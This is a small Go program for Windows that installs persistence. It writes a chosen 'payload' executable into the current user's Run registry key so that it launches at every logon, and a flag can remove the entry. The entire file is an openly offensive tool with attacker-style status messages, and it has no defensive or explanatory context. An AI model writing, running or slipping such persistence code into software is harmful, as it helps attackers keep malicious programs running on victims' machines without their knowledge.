package main

import (
  "fmt"
  "log"
  "flag"

  "golang.org/x/sys/windows/registry"
)

func main(){
  var payload string
  var delete_flag bool

  flag.StringVar(&payload, "p", "C:\\Windows\\System32\\cmd.exe", "write payload to execute on startup")
  flag.BoolVar(&delete_flag, "d", false, "delete current payload from registry key")
  flag.Parse()

  fmt.Println("[*] Opening registry key...")
  key, _, err := registry.CreateKey(
    registry.CURRENT_USER,
    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    registry.ALL_ACCESS,
  )

  if err != nil {
    log.Fatal(err)
  }
  defer key.Close()

  if delete_flag == false {
    fmt.Println("[*] Writing our payload: " + payload)
  } else {
    payload = ""
  }

  err = key.SetStringValue("", payload)
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("[+] Success!")
}



